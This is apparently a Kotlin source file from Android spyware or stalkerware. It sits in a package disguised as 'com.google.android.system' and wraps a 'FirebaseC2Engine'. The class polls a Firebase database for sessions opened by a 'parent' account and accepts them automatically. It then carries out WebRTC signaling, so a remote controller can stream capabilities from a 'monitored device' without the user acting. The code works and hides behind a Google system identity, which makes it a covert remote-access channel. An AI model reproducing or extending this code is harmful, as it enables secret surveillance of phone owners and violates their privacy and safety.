package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

/**
 * FirebaseSignalingRepository
 * Manages Firebase Realtime Database WebRTC signaling sessions with Firebase Auth token authorization.
 */
class FirebaseSignalingRepository(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine
) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val httpClient = OkHttpClient()

    private var activeSessionId: String? = null
    private var signalingJob: Job? = null

    companion object {
        private const val TAG = "FirebaseSignaling"
    }

    interface SignalingCallback {
        fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>)
        fun onOfferReceived(sdp: String)
        fun onAnswerReceived(sdp: String)
        fun onIceCandidateReceived(candidateJson: JSONObject)
        fun onSessionTerminated(sessionId: String)
    }

    private var callback: SignalingCallback? = null

    fun setCallback(cb: SignalingCallback) {
        this.callback = cb
    }

    fun stopListening() {
        try {
            signalingJob?.cancel()
            signalingJob = null
            Log.i(TAG, "WebRTC Signaling Listener Stopped.")
        } catch (_: Exception) {}
    }

    fun startListeningForSessionRequests() {
        signalingJob?.cancel()
        signalingJob = scope.launch {
            Log.i(TAG, "WebRTC Signaling Listener Active 🚀")
            while (isActive) {
                try {
                    val uid = firebaseEngine.refreshUserIdentity()
                    if (!uid.isNullOrBlank()) {
                        val parentUid = firebaseEngine.getParentUserId()
                        val account = firebaseEngine.getActiveAccount()
                        val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }

                        val url = "${account.databaseUrl}/users/$parentUid/devices/$devId/webrtc_signaling/sessions.json"
                        val request = firebaseEngine.buildAuthenticatedRequest(url, "GET")

                        if (request != null) {
                            httpClient.newCall(request).execute().use { response ->
                                if (response.isSuccessful) {
                                    val body = response.body?.string() ?: "null"
                                    if (body != "null" && body.startsWith("{")) {
                                        val json = JSONObject(body)
                                        val keys = json.keys()
                                        while (keys.hasNext()) {
                                            val sessId = keys.next()
                                            val sessObj = json.optJSONObject(sessId) ?: continue
                                            val status = sessObj.optString("status", "")
                                            val offer = sessObj.optJSONObject("offer")
                                            val answer = sessObj.optJSONObject("answer")
                                            val candidates = sessObj.optJSONObject("candidates")

                                            if ((status == "REQUESTED" || (offer != null && offer.has("sdp"))) && activeSessionId == null) {
                                                activeSessionId = sessId
                                                postAcceptSession(sessId)
                                                val reqCaps = mutableListOf<String>()
                                                val capsArr = sessObj.optJSONArray("requestedCapabilities")
                                                if (capsArr != null) {
                                                    for (i in 0 until capsArr.length()) reqCaps.add(capsArr.getString(i))
                                                }
                                                Log.i(TAG, "Incoming WebRTC Session Accepted: $sessId")
                                                callback?.onSessionRequested(sessId, reqCaps)
                                            }

                                            if (sessId == activeSessionId) {
                                                if (offer != null && offer.has("sdp") && !sessObj.optBoolean("offerProcessed", false)) {
                                                    markOfferProcessed(account, uid, devId, sessId)
                                                    callback?.onOfferReceived(offer.getString("sdp"))
                                                }

                                                if (answer != null && answer.has("sdp") && !sessObj.optBoolean("answerProcessed", false)) {
                                                    markAnswerProcessed(account, uid, devId, sessId)
                                                    callback?.onAnswerReceived(answer.getString("sdp"))
                                                }

                                                if (candidates != null) {
                                                    val candKeys = candidates.keys()
                                                    while (candKeys.hasNext()) {
                                                        val cKey = candKeys.next()
                                                        val cObj = candidates.optJSONObject(cKey) ?: continue
                                                        val sender = cObj.optString("sender", "")
                                                        if (sender != "ANDROID" && !cObj.optBoolean("processed", false)) {
                                                            markCandidateProcessed(account, uid, devId, sessId, cKey)
                                                            callback?.onIceCandidateReceived(cObj)
                                                        }
                                                    }
                                                }

                                                if (status == "TERMINATED" || status == "EXPIRED") {
                                                    val termId = activeSessionId ?: sessId
                                                    activeSessionId = null
                                                    callback?.onSessionTerminated(termId)
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Signaling loop error: ${e.message}")
                }
                delay(1500L) // 1.5s signaling poll
            }
        }
    }

    fun postAcceptSession(sessionId: String) {
        scope.launch {
            try {
                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
                val account = firebaseEngine.getActiveAccount()
                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/status.json"
                val body = "\"ACCEPTED\"".toRequestBody("application/json".toMediaTypeOrNull())
                val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@launch
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "postAcceptSession error: ${e.message}")
            }
        }
    }

    fun postSdpOffer(sessionId: String, sdp: String) {
        scope.launch {
            try {
                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
                val account = firebaseEngine.getActiveAccount()
                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/offer.json"
                val offerJson = JSONObject().apply {
                    put("type", "offer")
                    put("sdp", sdp)
                    put("revision", 1)
                }
                val body = offerJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@launch
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "postSdpOffer error: ${e.message}")
            }
        }
    }

    fun postSdpAnswer(sessionId: String, sdp: String) {
        scope.launch {
            try {
                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
                val account = firebaseEngine.getActiveAccount()
                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/answer.json"
                val answerJson = JSONObject().apply {
                    put("type", "answer")
                    put("sdp", sdp)
                    put("revision", 1)
                }
                val body = answerJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return@launch
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "postSdpAnswer error: ${e.message}")
            }
        }
    }

    fun postIceCandidate(sessionId: String, candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        scope.launch {
            try {
                val uid = firebaseEngine.refreshUserIdentity() ?: return@launch
                val account = firebaseEngine.getActiveAccount()
                val devId = firebaseEngine.currentDeviceId.ifBlank { "DEV_MONITORED_DEVICE" }

                val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessionId/candidates.json"
                val candJson = JSONObject().apply {
                    put("sender", "ANDROID")
                    put("candidate", candidate)
                    put("sdpMid", sdpMid)
                    put("sdpMLineIndex", sdpMLineIndex)
                    put("processed", false)
                }
                val body = candJson.toString().toRequestBody("application/json".toMediaTypeOrNull())
                val request = firebaseEngine.buildAuthenticatedRequest(url, "POST", body) ?: return@launch
                httpClient.newCall(request).execute().close()
            } catch (e: Exception) {
                Log.e(TAG, "postIceCandidate error: ${e.message}")
            }
        }
    }

    private fun markOfferProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String) {
        try {
            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/offerProcessed.json"
            val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
            val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
            httpClient.newCall(request).execute().close()
        } catch (_: Exception) {}
    }

    private fun markAnswerProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String) {
        try {
            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/answerProcessed.json"
            val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
            val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
            httpClient.newCall(request).execute().close()
        } catch (_: Exception) {}
    }

    private fun markCandidateProcessed(account: FirebaseC2Engine.FirebaseAccountConfig, uid: String, devId: String, sessId: String, candKey: String) {
        try {
            val url = "${account.databaseUrl}/users/$uid/devices/$devId/webrtc_signaling/sessions/$sessId/candidates/$candKey/processed.json"
            val body = "true".toRequestBody("application/json".toMediaTypeOrNull())
            val request = firebaseEngine.buildAuthenticatedRequest(url, "PUT", body) ?: return
            httpClient.newCall(request).execute().close()
        } catch (_: Exception) {}
    }
}
